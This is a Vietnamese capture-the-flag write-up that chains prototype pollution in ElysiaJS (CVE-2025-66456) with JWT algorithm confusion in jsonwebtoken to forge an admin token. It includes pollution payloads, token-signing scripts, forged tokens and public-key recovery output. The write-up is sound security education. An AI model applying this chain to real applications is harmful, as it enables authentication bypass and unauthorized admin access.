# Hachimi Revenger Fixed

| Competition | W1 Recruit       |
| ----------- | ---------------- |
| Category    | Web Exploitation |

## Overview

> Đây là bài khó nhất trong series **Hachimi Challenge** của W1 Recruit CTF. Mục tiêu là truy cập vào `/admin` để lấy flag. Exploit chain trong writeup này cũng có thể áp dụng cho **Hachimi**, **Hachimi revenger**, và **Hachimi fixed**.

## Solution

Khác với **Hachimi** và **Hachimi revenger**, challenge này đã khởi tạo `admin` user ngay từ lúc khởi động hệ thống ở `app/src/utils/data.ts:27-36`

```ts
const users = new Map<number, User>();
let nextId = 1;

export function addUser(username: string, password: string): User {
  const user = { id: nextId++, username, password };
  users.set(user.id, user);
  return user;
}

addUser("admin", "fake_admin_password");
```

Như vậy là attack vector của challenge trước là tạo account với `username` là `admin` đã không còn sử dụng được, vì bị ngăn chặn trong code ở tính năng đăng ký tài khoản tại `app/src/routes/auth.tsx:15-28`

```ts
return app
  .get("/register", () => <RegisterPage />)
  .post(
    "/register",
    ({ body, redirect }) => {
      const { username, password } = body;
      if (userExists(username)) {
        return <RegisterPage error="Username already taken" />;
      }
      addUser(username, password);
      return redirect("/login");
    },
    { body: credentialsSchema },
  )
```

Sau khi phân tích lại toàn bộ codebase và không tìm thấy gì mới thì mình có cảm giác attack vector sẽ đến từ 2 chỗ, thứ nhất là khả năng đến từ các thư viện, frameworks,... và thứ hai là có khả năng tồn tại lỗ hổng để có thể sign JWT token để giả mạo admin.

Mình tiếp tục tập trung vào 2 điểm này, trước tiên là mình kiểm tra xem các phiên bản thư viện, frameworks được cài vào ứng dụng web này có lỗ hổng gì không.

Sau 1 hồi research trên Internet thì mình phát hiện rằng `ElysiaJS` - core framework của app này có dính 1 số CVE liên quan đến **prototype pollution** như [CVE-2025-66456](https://nvd.nist.gov/vuln/detail/cve-2025-66456), [CVE-2026-31865](https://nvd.nist.gov/vuln/detail/cve-2026-31865),...

Trong đó, **CVE-2025-66456** ảnh hưởng các phiên bản từ `1.4.0` đến `1.4.16`. Kiểm tra lại trong `package.json`, ta thấy phiên bản đang chạy của ứng dụng này cũng là `1.4.16` - phiên bản chịu ảnh hưởng của CVE này. Ngay lập tức, mình bắt tay vào nghiên cứu CVE này để xem có thể tận dụng nó vào challenge này không.

### Prototype pollution

Prototype Pollution là một lỗ hổng trong JavaScript xảy ra khi attacker có thể ghi hoặc chỉnh sửa prototype của object, thường là `Object.prototype`.

Trong JavaScript, object có cơ chế kế thừa thông qua prototype chain. Khi truy cập một property không tồn tại trực tiếp trên object, JavaScript sẽ tiếp tục tìm property đó trên prototype của object. Vì hầu hết object thông thường đều kế thừa từ `Object.prototype`, nếu attacker pollute được prototype này thì
các object khác trong chương trình cũng có thể bị ảnh hưởng.

Ví dụ:

```js
Object.prototype.isAdmin = true;

const user = {};
console.log(user.isAdmin); // true
```

Ở ví dụ trên, object user không có property isAdmin, nhưng vẫn trả về true vì property này được kế thừa từ Object.prototype.

Prototype Pollution thường xuất hiện trong các hàm merge, clone, hoặc parse object khi ứng dụng xử lý input người dùng nhưng không chặn các key đặc biệt như:

```js
__proto__
constructor
prototype
```

Ví dụ một payload nguy hiểm:

```json
{
  "__proto__": {
    "isAdmin": true
  }
}
```

Nếu payload này đi vào một hàm merge recursive không an toàn, \_\_proto\_\_ có thể khiến quá trình merge ghi dữ liệu vào prototype thay vì chỉ ghi vào object đích.

Ví dụ:

```js
const payload = JSON.parse(`{
  "__proto__": {
    "isAdmin": true
  }
}`);

function mergeDeep(target, source) {
  for (const key of Object.keys(source)) {
    if (source[key] && typeof source[key] === "object") {
      mergeDeep(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}

mergeDeep({}, payload);

console.log(({}).isAdmin); // true
```

Ở đây, khi xử lý key \_\_proto\_\_, biểu thức target["\_\_proto\_\_"] trỏ tới prototype của object đích. Vì vậy lời gọi recursive tiếp theo sẽ ghi isAdmin = true vào prototype đó. Kết quả là object rỗng mới tạo sau đó cũng có thể đọc được isAdmin.

Từ đó, nếu ứng dụng có logic kiểm tra dựa trên property kế thừa qua prototype chain, ví dụ:

```js
if (user.isAdmin) {
  // I am Admin hahaha
}
```

Mặc dù user không thật sự có quyền admin, điều kiện vẫn pass do property được lấy từ prototype chain.

### CVE-2025-66456

CVE-2025-66456 là lỗ hổng Prototype Pollution trong ElysiaJS, ảnh hưởng các phiên bản từ `1.4.0` đến trước `1.4.17`.

Theo [advisory](https://github.com/advisories/GHSA-hxj9-33pp-j2cc), lỗi nằm ở hàm `mergeDeep()`, được dùng khi framework merge kết quả của nhiều schema validation có cùng key. Do thứ tự merge, để trigger được bug cần có một schema dùng kiểu `any` trong `standalone` guard. Kiểu `any` cho phép payload chứa key đặc biệt như `__proto__` đi qua validation và tiếp tục được đưa vào quá trình merge nội bộ. Ở bản `1.4.16` hàm chỉ bỏ qua các key nằm trong `skipKeys`:

```ts
for (const [key, value] of Object.entries(source)) {
  if (skipKeys?.includes(key)) continue

  // ...
}
```

Nhưng nó không mặc định chặn các key nguy hiểm như `__proto__`, `constructor`, hoặc `prototype`. Vì vậy ở nhánh merge recursive:

```ts
target[key as keyof typeof target] = mergeDeep(
  (target as any)[key] as any,
  value,
  { skipKeys, override, mergeArray }
)
```

Nếu key là `__proto__`, quá trình merge có thể ghi dữ liệu vào prototype chain.
Trong challenge này, app dùng `elysia 1.4.16`, đúng phiên bản bị ảnh hưởng, và ở endpoint `/dashboard/*` trong file `app/src/routes/dashboard.tsx:45:85` có pattern tương tự ví dụ bị lỗi của advisory:

```ts
export function dashboardRoutes(app: Elysia) {
  return app
    .guard({
      schema: "standalone",
      body: object({
        data: any(),
      }),
    })
    .get("/dashboard", ({ cookie, redirect }) => {
      const token = cookie.auth.value;
      if (!token) {
        return redirect("/login");
      }
      try {
        const payload = verifyToken<{ sub: number; username: string }>(
          String(token),
        );
        return (
          <DashboardPage
            name={payload.username}
            characters={getCharacters()}
            sort="default"
          />
        );
      } catch {
        return redirect("/login");
      }
    })
    .post(
      "/dashboard/api/characters",
      ({ body }) => {
        const sort = body.data.sort;
        return sortCharacters(getCharacters(), sort);
      },
      { body: sortSchema },
    )
    .get("/logout", ({ cookie, redirect }) => {
      cookie.auth.remove();
      return redirect("/");
    });
}
```

Đoạn code trên gần như trùng với ví dụ trong advisory, lớp `guard` nhận `data` với kiểu `any()` còn route con parse `data` bằng schema cụ thể hơn. Do đó, mình quyết định thử xem app có thật sự bị dính lỗi này không.

Để dễ quan sát hơn, mình code thêm 1 dòng `console.log({}.ducdev)` vào ngay sau `const sort = body.data.sort;`, code xử lý `POST` đến route `/dashboard/api/characters` bây giờ có dạng như sau:

```ts
.post(
  "/dashboard/api/characters",
  ({ body }) => {
    const sort = body.data.sort;
    console.log({}.ducdev); // Add to this for debug
    return sortCharacters(getCharacters(), sort);
  },
  { body: sortSchema },
)
```

Bây giờ payload kiểm tra của mình sẽ có dạng:

```json
{
  "data": {
    "sort": "name-az",
    "__proto__": {
      "ducdev": "i love uit"
    }
  }
}
```

Nếu dòng `console.log` mới được thêm vào log ra `i love uit` thì có thể chắc chắn rằng app này bị dính CVE-2025-66456.

![CVE-2025-66456 validation](./assets/cve-2025-66456-validation.png)

Có thể thấy là log đã có `i love uit`, như vậy có thể khẳng định app này bị dính CVE.

### JWT Algorithm Confusion Attack

Sau khi xác nhận app bị Prototype Pollution, mình không tìm ra được hướng nào để khai thác tiếp. Nên mình chuyển qua hướng thứ 2, là dò tìm các lỗ hổng liên quan tới authentication.

Cơ chế đăng nhập của app dựa trên JWT. Khi user login thành công, server ký một token và lưu token đó vào cookie `auth`. Ở các route cần đăng nhập, server lấy token từ cookie rồi verify lại để lấy thông tin user.

Phần xử lý JWT tập trung ở 3 hàm: `parseKey()`, `signToken()`, `verifyToken()` trong file `app/src/utils/key.ts:8-35`:

```ts
export function parseKey(
  type: "private" | "public",
  key: string,
  options: { format?: "pem" | "pkcs8" | "ssh" | "openssh" } = {},
): string {
  let parsedKey: sshpk.Key | sshpk.PrivateKey;
  if (type === "private") {
    parsedKey = sshpk.parsePrivateKey(key, "ssh");
  } else {
    parsedKey = sshpk.parseKey(key, "ssh", { filename: "publickey" });
  }
  return parsedKey.toString(options.format || "pem");
}

const privateRaw = readFileSync(PRIVATE_KEY_PATH, "utf8");

const publicRaw = readFileSync(PUBLIC_KEY_PATH, "utf8");

export function signToken(
  payload: object,
  expiresIn: jwt.SignOptions["expiresIn"] = "1h",
) {
  return jwt.sign(payload, parseKey("private", privateRaw), { algorithm: "ES256", expiresIn });
}

export function verifyToken<T = object>(token: string) {
  return jwt.verify(token, parseKey("public", publicRaw)) as T;
}
```

Ở đây, server ký token hợp lệ bằng thuật toán bất đối xứng `ES256` (asymmetric), private key dùng để sign và public key dùng để verify.

Tính đến thời điểm làm challenge này, mình chưa thật sự hiểu rõ về JWT Algorithm Confusion Attack, kèm với việc khi search các case study về kỹ thuật này với `ES256`, kết quả trả về không nhiều nên nghĩ là `ES256` thì không thực hiện được kỹ thuật tấn công trên.

Nhưng sau khi được hint về việc vẫn có thể thực hiện được thì mình đã đi research kỹ hơn về kỹ thuật này.

### Dive deeper about Algorithm Confusion Attack

Như tên gọi, đây là kỹ thuật mà attacker dùng để đánh lừa server verify signature của JWT bằng algorithm mà attacker mong muốn, thay vì algorithm chuẩn mà developer cài đặt cho server.

Có 2 loại algorithms thường được dùng là đối xứng (symmetric) và bất đối xứng (asymmetric).

- Đối với symmetric algorithm (ví dụ như HS256), server sẽ sử dụng chung 1 secret key cho cả sign và verify token. Secret key thì phải giữ bí mật tuyệt đối không được lộ cho users.
- Đối với asymmetric algorithm (ví dụ như RS256, ES256), server sử dụng private key để sign token và public key để verify token. Public key là khóa công khai, ai cũng có thể xem, còn private key phải được giữ bí mật.

Algorithm Confusion Attack diễn ra theo quy trình sau:

1. Server ban đầu thiết kế JWT theo hướng asymmetric, ví dụ `ES256`.
2. Token hợp lệ được ký bằng private key và verify bằng public key.
3. Attacker tạo token mới, nhưng đổi header `alg` sang symmetric algorithm, ví dụ `HS256`.
4. Nếu server không giới hạn algorithm khi verify, thư viện có thể dùng chính public key làm HMAC secret.
5. Vì public key không phải bí mật, attacker có thể dùng public key đó để ký token giả mạo.

Trong đoạn code của ứng dụng, thư viện được dùng để xử lý JWT là `jsonwebtoken`. Hàm verify token là `jwt.verify(token, publicKeyOrSecretKey, options)`. Hàm này nhận vào token cần kiểm tra, key dùng để verify, và một object `options` không bắt buộc.

Trong `options`, developer có thể truyền `algorithms` để giới hạn danh sách thuật toán được phép dùng, ví dụ `["ES256"]`. Nếu không truyền `algorithms`, `jsonwebtoken` sẽ tự chọn danh sách thuật toán mặc định dựa trên loại key được truyền vào: secret key thì cho phép nhóm `HS*`, RSA key thì cho phép nhóm `RS*`, còn EC public key thì cho phép nhóm `ES*`.

Sau đó thư viện lấy `alg` từ JWT header và kiểm tra xem algorithm này có nằm trong danh sách được phép hay không.

#### How `jsonwebtoken` classifies the key

Chúng ta thấy trong hàm `verifyToken()` ở `app/src/utils/key.ts:33-35`:

```ts
export function verifyToken<T = object>(token: string) {
  return jwt.verify(token, parseKey("public", publicRaw)) as T;
}
```

Chỉ gọi `jwt.verify()` với 2 đối số, vậy có tồn tại cách nào đó để ta đánh lừa được thư viện `jsonwebtoken` để kiểm soát được danh sách thuật toán được cho phép dùng để verify không?
Để xác nhận điều này, ta cần tìm hiểu sâu hơn về cách mà `jsonwebtoken` giới hạn danh sách thuật toán được dùng.

```js
// jsonwebtoken/verify.js:120-142

if (secretOrPublicKey != null && !(secretOrPublicKey instanceof KeyObject)) {
  try {
    secretOrPublicKey = createPublicKey(secretOrPublicKey);
  } catch (_) {
    try {
      secretOrPublicKey = createSecretKey(typeof secretOrPublicKey === 'string' ? Buffer.from(secretOrPublicKey) : secretOrPublicKey);
    } catch (_) {
      return done(new JsonWebTokenError('secretOrPublicKey is not valid key material'))
    }
  }
}

if (!options.algorithms) {
  if (secretOrPublicKey.type === 'secret') {
    options.algorithms = HS_ALGS;
  } else if (['rsa', 'rsa-pss'].includes(secretOrPublicKey.asymmetricKeyType)) {
    options.algorithms = RSA_KEY_ALGS
  } else if (secretOrPublicKey.asymmetricKeyType === 'ec') {
    options.algorithms = EC_KEY_ALGS
  } else {
    options.algorithms = PUB_KEY_ALGS
  }
}
```

Đoạn code trên nằm trong hàm `verify()` của `jsonwebtoken`, có thể thấy, nó kiểm tra có thể tạo ra được public key bằng cách gọi hàm `createPublicKey()`, nếu không được thì fallback về `createSecretKey()`. Vậy bây giờ ta cần nghiên cứu về `createPublicKey()` để xem có cách nào làm nó fallback ko.

![Node.js createPublicKey docs](./assets/node-create-public-key-docs.png)

Theo như docs thì hàm này nhận vào đối số là `key`, tuy nhiên điểm quan trọng có thể nhìn ra là: `key` này phải có format thuộc `pem`, `der`, hoặc `jwk`. Vậy nếu có cách truyền giá trị vào `key` mà không phải ở 1 trong 3 format trên thì ta sẽ có thể fallback xuống nhánh symmetric secret.

### Chaining Prototype Pollution to JWT Forgery

Vậy mục tiêu bây giờ là tìm cách khiến `createPublicKey()` không parse được key mà app truyền vào `jwt.verify()`. Để xem key đó đến từ đâu, mình quay lại hàm `verifyToken()` trong `app/src/utils/key.ts:33-35`:

```ts
export function verifyToken<T = object>(token: string) {
  return jwt.verify(token, parseKey("public", publicRaw)) as T;
}
```

Ở đây, app không truyền trực tiếp `publicRaw` vào `jwt.verify()`, mà truyền kết quả trả về từ `parseKey("public", publicRaw)`. Điều này có nghĩa là format output của `parseKey()` sẽ quyết định `jsonwebtoken` nhận diện key đó là public key hợp lệ hay chỉ là một secret string bình thường.

Vì vậy mình tiếp tục phân tích hàm `parseKey()` ở `app/src/utils/key.ts:8-20`:

```ts
export function parseKey(
  type: "private" | "public",
  key: string,
  options: { format?: "pem" | "pkcs8" | "ssh" | "openssh" } = {},
): string {
  let parsedKey: sshpk.Key | sshpk.PrivateKey;
  if (type === "private") {
    parsedKey = sshpk.parsePrivateKey(key, "ssh");
  } else {
    parsedKey = sshpk.parseKey(key, "ssh", { filename: "publickey" });
  }
  return parsedKey.toString(options.format || "pem");
}
```

Hàm này nhận vào 3 đối số: `type` để xác định private/public key, `key` là nội dung key gốc, và `options` là object tùy chọn. Trong đó, `options.format` quyết định format output khi gọi `parsedKey.toString(...)`.

Điểm đáng chú ý nằm ở dòng cuối:

```ts
return parsedKey.toString(options.format || "pem");
```

Nếu gọi `parseKey()` bình thường, đối số options không được truyền vào nên sẽ nhận giá trị mặc định là object rỗng `{}`. Khi đó `options.format` là `undefined`, nên hàm sẽ dùng `"pem"` làm format mặc định.

Với format PEM, hàm `createPublicKey()` sẽ parse được nên `jsonwebtoken` sẽ nhận diện đây là ES public key và chỉ cho phép nhóm thuật toán `ES*`.

Tuy nhiên, vì `options` chỉ là object thường nên nó vẫn chịu ảnh hưởng từ prototype chain. Ở phía trên, mình đã chứng minh app bị Prototype Pollution, nên giả thuyết lúc này là có thể dùng gadget đó để pollute `Object.prototype.format = "ssh"`.

Vì `options` là một object rỗng, nên khi truy cập `options.format`, JavaScript sẽ không tìm thấy own property `format` trên chính object này. Lúc đó nó tiếp tục tra cứu trên prototype chain và lấy được giá trị từ `Object.prototype.format` mà mình đã pollute trước đó.

Do đó, lúc này output của hàm `parseKey()` sẽ là public key ở format `ssh` thay vì `pem`. Vì chuỗi SSH public key này không được `createPublicKey()` parse thành public key hợp lệ, `jsonwebtoken` sẽ fallback xuống nhánh `createSecretKey()` và coi chuỗi đó như một symmetric secret. Từ đó, danh sách thuật toán verify mặc định được chọn sẽ là nhóm `HS*`.

Như vậy, sau khi pollute `Object.prototype.format = "ssh"`, server sẽ verify token `HS256` bằng chính chuỗi public key SSH như một symmetric secret. Vì vậy mình có thể dùng cùng chuỗi public key đó để ký JWT mới với payload `username: "admin"`, rồi thay cookie `auth` bằng token vừa tạo.

#### Validating the Analysis

Tới đây thì mình bắt tay vào kiểm chứng giả thuyết. Trước tiên mình viết một script nhỏ để ký token với public key có sẵn trong attachment của challenge.

```js
// sign_jwt.js

const { readFileSync } = require("fs");
const jwt = require("jsonwebtoken");
const sshpk = require("sshpk");

function parseKey(key) {
  const parsedKey = sshpk.parseKey(key, "ssh", { filename: "publickey" });
  return parsedKey.toString("ssh");
}

const PUBLIC_KEY_PATH = "./secrets/key.pub";
const publicRaw = readFileSync(PUBLIC_KEY_PATH, "utf8");
const secret = parseKey(publicRaw);

const payload = {
  sub: "1",
  username: "admin",
};

const token = jwt.sign(payload, secret, { algorithm: "HS256" });
console.log(token);
```

Chạy file trên mình có được token giả mạo admin:

```bash
$ node sign_jwt.js
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhZG1pbiIsImlhdCI6MTc4OTM2MzY3OH0.HnnlD2Y1d06xCEEgIJGDeYNp8rEw4PfGObJYJ5TOUY8
```

Tiếp theo là sẽ thực hiện pollute vào `Object.prototype.format` với payload gửi `POST` ở `/dashboard/api/characters`:

```json
{
  "data": {
    "sort": "name-az",
    "__proto__": {
      "format": "ssh"
    }
  }
}
```

![Prototype pollution format payload](./assets/exploit-chain-pollute-format.png)

Sau khi pollute xong, mình refresh lại trang và bị redirect về `/login`. Nguyên nhân là token cũ của account `ducdev` được ký bằng `ES256`, nhưng lúc verify thì `parseKey()` đã trả về public key format `ssh`. `jsonwebtoken` lúc này coi key đó như symmetric secret và chọn nhóm thuật toán `HS*`, nên token `ES256` cũ không còn verify được nữa.

![Old ES256 session invalidated](./assets/exploit-chain-session-invalidated.png)

Cuối cùng, mình thay cookie `auth` bằng token `HS256` đã ký ở trên rồi truy cập `/admin`.

![Admin access with forged token](./assets/exploit-chain-admin-access.png)

Kết quả là server chấp nhận token mới và render trang admin. Như vậy phần phân tích đã đúng: Prototype Pollution được dùng để đổi output format của `parseKey()`, còn JWT Algorithm Confusion được dùng để forge token admin.

#### Recovering the Public Key

Tới đây thì mình tưởng là xong hết rồi, lặp lại các bước vừa rồi trên server thật của challenger thôi. Nhưng không, đời không như là mơ, BTC bảo rằng key trên server và trong attachment không giống nhau :v :(.

![Remote server key notification](./assets/challenge-noti.png)

Sau đó mình có research thêm thì mình biết được với ES256, từ message và signature trong JWT có thể khôi phục ra các public key candidate có khả năng tạo ra chữ ký đó.

Sau đó mình lên github lấy tool recover về và dùng với token của server để lấy ra public key. Tool mình dùng là: [JWT-Key-Recovery](https://github.com/FlorianPicca/JWT-Key-Recovery)

```bash
$ ./recover.py eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjIsInVzZXJuYW1lIjoiZHVjZGV2IiwiaWF0IjoxNzg5MzY1MDk5LCJleHAiOjE3ODkzNjg2OTl9.dHncjrU3p8xmBocKLvycD5XoTr2q6w3DSxg8DlXKPpvsNm3_7bhl_wBOT4MxiFmcxC0ROwH44XtpENLz8U_hYw
Recovering public key for algorithm ES256...
There are 2 public keys that can produce this signature.
As it's not possible to know which one was used, both are displayed below.
Found 2 public ECDSA keys !
x=60859403048088953233867117085459473822050186534038813878932092278997408904026
y=56356271283832183318134011691917746531157897464777452570644377813523743655715
-----BEGIN PUBLIC KEY-----
MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEho0zkSGhCS/EUf77TNCgGaoUPZIq
AA1+w1wxqYqZc1p8mITowgvJjjLtJkP7KiBoU2OyhZaHW2vzdI1DHeRHIw==
-----END PUBLIC KEY-----

x=69315661813355357763689390270582075857712215202315038556565951458346690788606
y=9547143611285859876897254947664022794237660533198102157615980783616365338851
-----BEGIN PUBLIC KEY-----
MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEmT9GN17kLCJHWyiVLcFrpsaELjYD
U9oqcXDQBxZJvP4VG33mC3Z16uZtCeWCjKNwug25RLtGQUE8efSKLlag4w==
-----END PUBLIC KEY-----
```

Tới đây thì mình có 2 candidate cho public key của server. Tuy nhiên đây là key ở dạng PEM, mình cần chuyển sang ssh để có thể ký và thử xem key nào mới chính xác.

Mình viết tiếp một script nhỏ để làm việc này:

```js
// check_candidate.js

const fs = require("fs");
const jwt = require("jsonwebtoken");
const sshpk = require("sshpk");

const candidates = ["recover_candidate_1.pem", "recover_candidate_2.pem"];

for (const file of candidates) {
  const pem = fs.readFileSync(file, "utf8");
  const secret = sshpk
    .parseKey(pem, "pem", { filename: "publickey" })
    .toString("ssh");

  const token = jwt.sign(
    {
      sub: 1,
      username: "admin",
    }, secret, { algorithm: "HS256" },
  );

  console.log("==", file, "==");
  console.log("secret =", JSON.stringify(secret));
  console.log("token  =", token);
  console.log();
}
```

Chạy script và lấy kết quả:

```bash
$ node check_candidate.js
== recover_candidate_1.pem ==
secret = "ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIywkPsoS+jGTiktobtB/t8v7By8NWExhBGyc3U8ZkUSRNhjjAoUWleH7ukgTcbkUkcbHUQw2BPVbYsYoOFZEcQ= publickey"
token  = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInVzZXJuYW1lIjoiYWRtaW4iLCJpYXQiOjE3ODkzNjUzNDh9.HR59G9c-17DGa-lh0qqULIrCqu5qmE7XM5yDiebbOzs

== recover_candidate_2.pem ==
secret = "ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJk/Rjde5CwiR1solS3Ba6bGhC42A1PaKnFw0AcWSbz+FRt95gt2dermbQnlgoyjcLoNuUS7RkFBPHn0ii5WoOM= publickey"
token  = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInVzZXJuYW1lIjoiYWRtaW4iLCJpYXQiOjE3ODkzNjUzNDh9.ngcFkbu5uDuvQ33Idkh0fJnkrhYl0nizJRm7o-B0WqY
```

Sau đó ta thử cả 2 token xem cái nào truy cập được admin.

### Full Exploit Chain

Như vậy, toàn bộ exploit chain của ta như sau:

1. Login bằng user thường để lấy một JWT `ES256` hợp lệ từ server.
2. Dùng JWT đó để recover các candidate public key của server.
3. Convert từng candidate public key từ PEM sang SSH format.
4. Gửi payload Prototype Pollution tới `POST /dashboard/api/characters` để pollute `Object.prototype.format = "ssh"`.
5. Dùng từng SSH public key candidate làm HMAC secret để ký JWT `HS256` với payload `username: "admin"`.
6. Thay cookie `auth` bằng token vừa ký và thử truy cập `/admin`.
7. Candidate nào được server chấp nhận sẽ cho phép vào trang admin và lấy flag.

![Admin access on remote server](./assets/admin-access.png)

## References

- [PortSwigger - Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
- [NVD - CVE-2025-66456](https://nvd.nist.gov/vuln/detail/cve-2025-66456)
- [GitHub Advisory - CVE-2025-66456](https://github.com/advisories/GHSA-hxj9-33pp-j2cc)
- [NPM - jsonwebtoken](https://www.npmjs.com/package/jsonwebtoken?activeTab=code)
- [Node.js Docs - crypto.createPublicKey](https://nodejs.org/api/crypto.html#cryptocreatepublickeykey)
- [JWT-Key-Recovery](https://github.com/FlorianPicca/JWT-Key-Recovery)
